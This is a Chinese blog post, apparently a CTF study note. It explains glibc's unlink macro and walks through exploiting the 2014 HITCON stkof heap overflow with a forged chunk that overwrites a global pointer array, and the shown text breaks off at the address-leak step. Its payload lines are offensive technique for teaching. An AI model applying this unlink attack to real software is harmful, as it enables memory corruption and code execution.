@@ -1,0 +1,507 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>unsortedbin的unlink | zhuyuan's Blog</title><meta name="author" content="主元"><meta name="copyright" content="主元"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="unsortedbin的unlink参考资料https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;108481889 holk大佬的文章写的非常nice，对初学unlink的很友好，本文很多都是参考的holk大佬的思路的 https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;yki7ng  UnlinkUnlink是什么简单翻">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unsortedbin的unlink">
+<meta property="og:url" content="https://zhuyuan1213.github.io/2023/07/24/unsortedbin%E7%9A%84unlink/index.html">
+<meta property="og:site_name" content="zhuyuan&#39;s Blog">
+<meta property="og:description" content="unsortedbin的unlink参考资料https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;108481889 holk大佬的文章写的非常nice，对初学unlink的很友好，本文很多都是参考的holk大佬的思路的 https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;yki7ng  UnlinkUnlink是什么简单翻">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://w.wallhaven.cc/full/3l/wallhaven-3lrqpy.jpg">
+<meta property="article:published_time" content="2023-07-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-07-24T02:21:28.039Z">
+<meta property="article:author" content="主元">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="study">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://w.wallhaven.cc/full/3l/wallhaven-3lrqpy.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zhuyuan1213.github.io/2023/07/24/unsortedbin%E7%9A%84unlink/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'unsortedbin的unlink',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-24 10:21:28'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://w.wallhaven.cc/full/3l/wallhaven-3lrqpy.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zhuyuan's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">unsortedbin的unlink</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-24T02:21:28.039Z" title="更新于 2023-07-24 10:21:28">2023-07-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="unsortedbin的unlink"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="unsortedbin的unlink"><a href="#unsortedbin的unlink" class="headerlink" title="unsortedbin的unlink"></a>unsortedbin的unlink</h1><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><pre><code>https://blog.csdn.net/qq_41202237/article/details/108481889
+holk大佬的文章写的非常nice，对初学unlink的很友好，本文很多都是参考的holk大佬的思路的
+https://www.yuque.com/cyberangel/rg9gdm/yki7ng
+</code></pre>
+<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="Unlink是什么"><a href="#Unlink是什么" class="headerlink" title="Unlink是什么"></a>Unlink是什么</h3><p>简单翻译一下就是断开链接</p>
+<p>先简单提出两个点：</p>
+<ul>
+<li>unlink是什么</li>
+<li>什么时候执行了unlink</li>
+</ul>
+<p>这两个问题在你初识unlink的时候估计也会想到，翻看libc源码，在2.23版本中在malloc.c中找到了unlink。unlink其实是libc中定义的一个宏，定义如下：</p>
+<pre><code class="c">#define unlink(AV, P, BK, FD) &#123;                                            
+    FD = P-&gt;fd;								      
+    BK = P-&gt;bk;								      
+    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      
+      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  
+    else &#123;								      
+        FD-&gt;bk = BK;							      
+        BK-&gt;fd = FD;							      
+        if (!in_smallbin_range (P-&gt;size)				      
+            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      
+        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      
+        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    
+          malloc_printerr (check_action,				      
+                   &quot;corrupted double-linked list (not small)&quot;,    
+                   P, AV);					      
+            if (FD-&gt;fd_nextsize == NULL) &#123;				      
+                if (P-&gt;fd_nextsize == P)				      
+                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      
+                else &#123;							      
+                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      
+                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      
+                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      
+                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      
+                  &#125;							      
+              &#125; else &#123;							      
+                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      
+                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      
+              &#125;								      
+          &#125;								      
+      &#125;									      
+&#125;
+</code></pre>
+<p>那什么时候执行了unlink呢？在执行free()函数时执行了_ _int_free()函数，在_int_free()函数中调用了unlink宏，大概的意思如下（注意_int_free()是函数不是宏）：</p>
+<pre><code class="c">#define unlink(AV, P, BK, FD)
+static void _int_free (mstate av, mchunkptr p, int have_lock)
+free()&#123;
+    _int_free()&#123;
+        unlink();
+    &#125;
+&#125;
+</code></pre>
+<p>简而言之就是**free()–&gt;_int_free()–&gt;unlink()**。</p>
+<h3 id="堆释放"><a href="#堆释放" class="headerlink" title="堆释放"></a>堆释放</h3><p>先回顾一下调用free函数堆释放的知识。</p>
+<pre><code class="c">//gcc -g test.c -o test
+#include&lt;stdio.h&gt;
+
+void main()&#123;
+     long *p1 = malloc(0x80);
+     long *first_chunk = malloc(0x80);
+     long *p2 = malloc(0x80);
+     long *second_chunk = malloc(0x80);	
+     long *p3 = malloc(0x80);
+     long *third_chunk = malloc(0x80);
+     long *p4 = malloc(0x80);
+     
+     free(first_chunk);
+     free(second_chunk);
+     free(third_chunk);
+     
+     return 0;
+&#125;
+</code></pre>
+<p>举一个例子，这里申请了7个chunk，接着依次释放了first_chunk、second_chunk、third_chunk。这里为什么释放这几个chunk呢，因为地址相邻的chunk释放之后会进行合并，地址不相邻的时候不会合并。由于申请的是0x80的chunk，所以在释放之后不会进fastbin而是先进unsortbin。我们用gdb打开编译好的例子，因为使用了-g参数，所以我们在第17行使用命令b 17下断点，接下来让程序跑起来，使用命令bin我们看一下双向链表中的排列结构：<br><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723161358692.png" alt="image-20230723161358692"></p>
+<p>可以看到已经有三个chunk_free进入了unsortbin。那么这三个chunk_free<strong>从右向左</strong>分别对应着first_chunk、second_chunk、third_chunk，我们使用<code>heap</code>命令查看一下这几个chunk：</p>
+<p>third_chunk</p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723162848069.png" alt="image-20230723162848069"></p>
+<p>second_chunk</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723162928484.png" alt="image-20230723162928484"></p>
+<p>first_chunk</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723162953367.png" alt="image-20230723162953367"></p>
+<p>这几个释放的chunk已经按照unsortbin中的顺序排列。这里主要看每一个chunk的fd、bk：</p>
+<ul>
+<li>first_bk -&gt; second</li>
+<li>second_fd -&gt; first 、 second_bk -&gt; third</li>
+<li>third_fd -&gt; second</li>
+</ul>
+<h3 id="unlink过程及检查"><a href="#unlink过程及检查" class="headerlink" title="unlink过程及检查"></a>unlink过程及检查</h3><p>还是用前面堆释放的例子，依次释放了first_chunk、second_chunk、third_chunk，也就是说首先释放的是first，然后释放的是second，最后释放的是third。在双链表中的结构如下：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200911135522507.png" alt="img"></p>
+<p>我个人理解的unlink是把second_chunk从双链表里摘掉。</p>
+<p>在前面堆释放部分我们讲过fd其实是前一个被释放chunk的prev_size地址，bk是后一个被释放的chunk的prev_size地址，所以：</p>
+<pre><code>second_fd = first_prev_addr
+second_bk = third_prev_addr
+</code></pre>
+<p>如果second_chunk被摘掉，那么就会变成下面这样：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200911152738722.png" alt="img"></p>
+<p>由于first_chunk是最开始被释放的，所以first_chunk相对于third_chunk是前一个被释放的块。同样的third_chunk是之后释放的，所以third_chunk相对于first_chunk是后一个被释放的块，所以：</p>
+<pre><code>first_bk = third_prev_addr
+third_fd = first_prev_addr
+</code></pre>
+<h3 id="chunk状态检查"><a href="#chunk状态检查" class="headerlink" title="chunk状态检查"></a>chunk状态检查</h3><p>现在我们用的大多数linux都会对chunk状态进行检查，以免造成二次释放或者二次申请的问题。但是恰恰是这个检查的流程本身就存在一些问题，能够让我们进行利用。回顾一下以往我们做的题，大部分都是顺着原有的执行流程走，但是通过修改执行所用的数据来改变执行走向。unlink同样可以以这种方式进行利用，由于unlink是在free()函数中调用的，所以我们只看chunk空闲时都需要检查写什么</p>
+<p>还是前面的例子</p>
+<p>在第17行下断点，查看一下second_chunk。</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723174129172.png" alt="image-20230723174129172"></p>
+<p><strong>检查1</strong>：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p>
+<p>可以看左图绿色框中的内容，上面绿色框中的内容是second_chunk的size大小，下面蓝色内容是p3的prev_size，这两个绿色框中的数值是需要相等的（忽略P标志位）。在wiki上我记得在基础部分有讲过，如果一个块属于空闲状态，那么相邻高地址块的prev_size为前一个块的大小</p>
+<p><strong>检查2</strong>：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p>
+<p>可以看左图蓝色框中的内容，这里是p3的size，p3的size的P标志位为0，代表着它前一个chunk(second_chunk)为空闲状态</p>
+<p><strong>检查3</strong>：检查前后被释放chunk的fd和bk</p>
+<p>可以看左图红色框中的内容，这里是second_chunk的fd和bk。首先看fd，它指向的位置就是前一个被释放的块first_chunk，这里需要检查的是first_chunk的bk是否指向second_chunk的地址。再看second_chunk的bk，它指向的是后一个被释放的块third_chunk，这里需要检查的是third_chunk的fd是否指向second_chunk的地址</p>
+<h3 id="例题：2014-HITCON-stkof"><a href="#例题：2014-HITCON-stkof" class="headerlink" title="例题：2014 HITCON stkof"></a>例题：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">2014 HITCON stkof</a></h3><pre><code class="http">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof
+</code></pre>
+<h4 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h4><p>先检查一下程序的保护机制：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723174517600.png" alt="image-20230723174517600"></p>
+<p>可以看到是64位程序，只开启了canary和NX保护</p>
+<h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>这道题运行起来没有任何回显，只有一个等待输入的状态。所以这道题只能根据静态分析来判断程序流程，用ida x64查看一下：</p>
+<h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723174637532.png" alt="image-20230723174637532"></p>
+<p>输入判断，根据输入的值不同，执行相应的函数。</p>
+<h4 id="creat-heap函数"><a href="#creat-heap函数" class="headerlink" title="creat_heap函数"></a>creat_heap函数</h4><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723175148351.png" alt="image-20230723175148351"></p>
+<p>堆的序列是从1开始的</p>
+<h4 id="edit-heap函数"><a href="#edit-heap函数" class="headerlink" title="edit_heap函数"></a>edit_heap函数</h4><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723175243578.png" alt="image-20230723175243578"></p>
+<p>堆溢出</p>
+<p>首先这里用到了fread()函数，这个函数会从给定流 stream 读取数据到 ptr 所指向的数组中，函数原型如下：</p>
+<pre><code class="c">size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
+</code></pre>
+<p>参数</p>
+<ul>
+<li>ptr – 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针</li>
+<li>size – 这是要读取的每个元素的大小，以字节为单位</li>
+<li>nmemb – 这是元素的个数，每个元素的大小为 size 字节</li>
+<li>stream – 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输入流</li>
+</ul>
+<p>返回值</p>
+<p>成功读取的元素总数会以 size_t 对象返回，size_t 对象是一个整型数据类型。如果总数与 nmemb 参数不同，则可能发生了一个错误或者到达了文件末尾</p>
+<p>也就是说循环中的<code>i = fread(ptr, 1ull, n, stdin)</code>是等于输入字符的数量，接下来判断的是i是否大于0，然后执行向地址写的操作</p>
+<p>本身代码没什么问题，但是程序的业务逻辑是有问题的。无论我们输入多长的字符串，程序都会将字符串从chunk_data的起始位置开始写进去，本身chunk_data在申请的时候是有长度限制的，但是由于一个不限制长度的字符串写进定长的范围内，这就造成了堆溢出</p>
+<h4 id="delete-heap函数"><a href="#delete-heap函数" class="headerlink" title="delete_heap函数"></a>delete_heap函数</h4><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723175334265.png" alt="image-20230723175334265"></p>
+<h3 id="思路分析及动态调试"><a href="#思路分析及动态调试" class="headerlink" title="思路分析及动态调试"></a>思路分析及动态调试</h3><h4 id="1、模仿程序流程写出payload"><a href="#1、模仿程序流程写出payload" class="headerlink" title="1、模仿程序流程写出payload"></a>1、模仿程序流程写出payload</h4><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723180328336.png" alt="image-20230723180328336"></p>
+<h4 id="2、创建3个chunk"><a href="#2、创建3个chunk" class="headerlink" title="2、创建3个chunk"></a>2、创建3个chunk</h4><p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723180922468.png" alt="image-20230723180922468"></p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723180718476.png" alt="image-20230723180718476"></p>
+<p>我们创建了三个chunk，第一个大小为100，第二个为30，第三个为80。按理说在gdb中时候用heap命令应该只会看到四个chunk(含top_chunk)，但是这次出现了六个chunk。多出来的两个chunk其实是由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区，即初次使用fget()函数和printf()函数的时候</p>
+<p>那这样一来我们可能就无法堆chunk1做什么操作了，因为chunk1是被两个io_chunk包围住的，我们也不能够控制io_chunk。即使一定要利用chunk1的话也只能先通过堆溢出先覆盖io_chunk，但是这样太麻烦了。所以我们可以考虑更加容易利用的chunk2和chunk3，由chunk2溢出至chunk3，也方便控制流程走向</p>
+<h4 id="部署fake-chunk环境"><a href="#部署fake-chunk环境" class="headerlink" title="部署fake_chunk环境"></a>部署fake_chunk环境</h4><p>如果想要利用unlink的方式，那么势必要有一个空闲块。我们目前都是申请，哪来的空闲块？的确没有，但是可以构造空闲块嘛。如果我们在chunk2的data部分伪造一个fake_chunk，并且这个fake_chunk处于释放状态。通过堆溢出的方式和修改chunk3的prev_size和size的P标志位，使得在释放chunk3的时候发生向前合并，这样就能触发unlink了：<br><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200916161456985.png" alt="img"></p>
+<p>如果想要构造一个人能够触发unlink的fake_chunk，那么它的大小至少为：</p>
+<pre><code>0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 0x30
+</code></pre>
+<p>因为fake_chunk是放在chunk2的data中的，所以chunk2的data大小至少需要0x30</p>
+<p>为了能够使得在释放chunk3的时候能够向前合并fake_chunk，并且<strong>绕过检查</strong>，那么chunk3的prev_size就要等于fake_chunk的size大小，即0x30，这样才能说明前一个chunk(fake_chunk)是释放状态</p>
+<p>如果想要触发unlink，那么chunk3的大小就必须超过fast_bin的最大值，所以chunk3的size就至少是0x90，并且chunk3的size的P标志位必须为0：<br><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200916161337882.png" alt="img"></p>
+<pre><code class="python">payload1.0 = fake_chunk + p64(0x30) + p64(0x90)
+</code></pre>
+<h4 id="构造fake-chunk"><a href="#构造fake-chunk" class="headerlink" title="构造fake_chunk"></a>构造fake_chunk</h4><p>上面我们已经将fake_chunk的外部因素确定了，那么接下来需要考虑的就是fake_chunk怎么构造了：</p>
+<ul>
+<li>prev_size：我们其实只想通过释放chunk3的时候向前合并fake_chunk，并不需要合并chunk2，所以fake_chunk的prev_size置零就行</li>
+<li>size：其实fake_chunk仅仅需要fd和bk完成unlink流程就可以了，后面的next_prev和next_size仅仅为了检查时候用，所以size的大小为0x20就行</li>
+<li>next_prev：这里其实就是为了绕过检查，证明fake_chunk是一个空闲块，所以next_prev要等于size，即0x20</li>
+<li>next_size：没啥用，不检查这里，用字符串占位就好</li>
+</ul>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200916161224428.png" alt="img"></p>
+<pre><code class="python">payload2.0 = p64(0) + p64(0x20) + fd_bk + p64(0x20) + &quot;hollkhol&quot; + p64(0x30) + p64(0x90)
+</code></pre>
+<p>现在就剩下fake_chunk的fd和bk了，需要提醒的是，为了能够使fake_chunk合法，就必须遵循前面理论部分讲的检查3，因此我们要将fake_chunk当做second_chunk来看待</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200916154208564.png" alt="img"></p>
+<p>我们可能并不清楚fake_chunk的fd和bk为多少，但是我们能够知道first_chunk的bk和third_chunk的fd为fake_chunk的prev_size地址</p>
+<p>回到gdb调试程序中，把chunk2内容修改成<code>payload2.0</code>，然后<code>ctrl + c</code>回到调试界面，我们看一下fake_chunk的prev_size地址是多少：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723182545335.png" alt="image-20230723182545335"></p>
+<p>可以看到fake_chunk的prev_size的地址为0xe06540，这个地址同时也是chunk2的data起始地址。那么回想一下在前面静态分析阶段，发现所有创建的chunk的data起始地址都记录在s[]数组中，并通过跟踪得到了s[]数组的地址：0x602140（如果忘记了，请翻看前面静态分析的创建功能部分）</p>
+<p>我们查看一下这个数组地址：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200916163533794.png" alt="img"></p>
+<p>如果我们将0x602140作为一个<code>chunk</code>来看的话，它的<code>fd</code>就是0xe06540，也就是说<code>0x602140</code>如果作为一个chunk来看待的话，就可以作为<code>third_chunk</code>：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200916164553827.png" alt="在这里插入图片描述"></p>
+<p>这样一来我们找到了third_chunk的地址<code>0x602140</code>，进而知道了fake_chunk的bk值为<code>0x602140</code></p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200916165312352.png" alt="img"></p>
+<p>同样的思路，我们将<code>0x602140 - 0x8</code>的位置也看做是一个<code>chunk</code>，那么这个chunk的<code>bk</code>就是0x602140，所以这个chunk可以作为<code>first_chunk</code>：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200916165646634.png" alt="img"></p>
+<p>这样一来我们伪造的fake_chunk就准备齐全了：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200916165939607.png" alt="img"></p>
+<pre><code class="python">s = 0x602140
+payload3.0 = p64(0) + p64(0x20) + p64(s - 0x8) + p64(s) + p64(0x20) + &quot;aaaaaaaa&quot; + p64(0x30) + p64(0x90)
+</code></pre>
+<p>将上面的payload写入chunk2后效果为：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200916170409814.png" alt="img"></p>
+<h4 id="触发unlink"><a href="#触发unlink" class="headerlink" title="触发unlink"></a>触发unlink</h4><p>unlink的过程</p>
+<ul>
+<li>释放chunk3触发unlink</li>
+<li>unlink实际上就是从双向链表中摘除某一个chunk</li>
+</ul>
+<p>为什么释放chunk3就会触发unlink呢？首先fake_chunk与chunk3的地址相邻的，由于我们伪造的fake_chunk是空闲状态，所以在释放chunk3的过程中会发生向前合并，也就是说chunk3要与fake_chunk合并成一个大chunk。但是fake_chunk在我们构造的时候为了绕过检查，所以不得不与first_chunk和third_chunk组成双向链表，所以chunk3就需要直接将fake_chunk从双向链表中拖出：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200917141220517.png" alt="在这里插入图片描述"></p>
+<p>摘除后：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/2020091714205676.png" alt="img"></p>
+<p>① fake_chunk被摘除之后首先执行的就是<code>first_bk = third_addr</code>，也就是说first_chunk的bk由原来指向fake_chunk地址更改成指向third_chunk地址：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200917142855267.png" alt="img"></p>
+<p>② 接下来执行<code>third_fd = first_addr</code>，即third_chunk的fd由由原来指向fake_chunk地址更改成first_chunk地址：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200917143442238.png" alt="img"></p>
+<p>这里需要注意的是third_chunk的fd与first_chunk的bk更改的其实是一个位置，但是由于third_fd &#x3D; first_add后执行，所以此处内容会从0x602140被覆盖成0x602138</p>
+<h4 id="泄露函数地址"><a href="#泄露函数地址" class="headerlink" title="泄露函数地址"></a>泄露函数地址</h4><p>以上就是整个unlink过程了，由于这个程序本身并没有system(&#x2F;bin&#x2F;sh)，所以接下来需要考虑的就是通过泄露的方式来从libc中寻找了。在泄露之前呢，我们先看一下，经过unlink之后s[]数组变成了什么样子，因为再怎么说，我们也得从程序修改功能中输入来控制执行流程，那么执行修改功能首先就需要去s[]数组中找到对应的chunk，所以这部分还得是从s[]数组入手：</p>
+<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230723183544002.png" alt="image-20230723183544002"></p>
+<p>可以看到经过”fake_chunk争夺战“以双向链表阵营”战败“而告终，那么战场s[]数组内部变成了这样。s[1]就是chunk1的data指针，因为整个过程中chunk1并没有使用过，所以s[1]并无大碍。但是s[2]的位置原本是chunk2的data指针，经过unlink之后变成了0x602138。最后就是s[3]了，这里原本是chunk3的data指针，但是由于前面为了触发unlink，所以chunk3被释放了，所以s[3]中被置空</p>
